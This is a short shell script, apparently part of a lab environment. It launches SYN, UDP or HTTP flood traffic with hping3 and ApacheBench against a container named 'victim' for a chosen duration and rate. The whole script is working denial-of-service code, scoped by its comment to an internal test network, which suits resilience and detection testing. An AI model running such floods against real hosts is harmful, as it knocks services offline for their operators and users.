#!/bin/sh
# Usage: attack <syn|udp|http> <seconds> [packets_per_second]
# Targets the `victim` container only, on the internal lab network.
set -eu
kind=$1 secs=$2 pps=${3:-2000}
interval="u$((1000000 / pps))"

case "$kind" in
  syn) timeout "$secs" hping3 --quiet -S -p 80 -i "$interval" victim || [ $? -eq 124 ] ;;
  udp) timeout "$secs" hping3 --quiet --udp -p ++1024 -i "$interval" victim || [ $? -eq 124 ] ;;
  http) ab -q -t "$secs" -c 50 -n 100000000 http://victim/ >/dev/null ;;
  *) echo "usage: attack <syn|udp|http> <seconds> [pps]" >&2; exit 2 ;;
esac
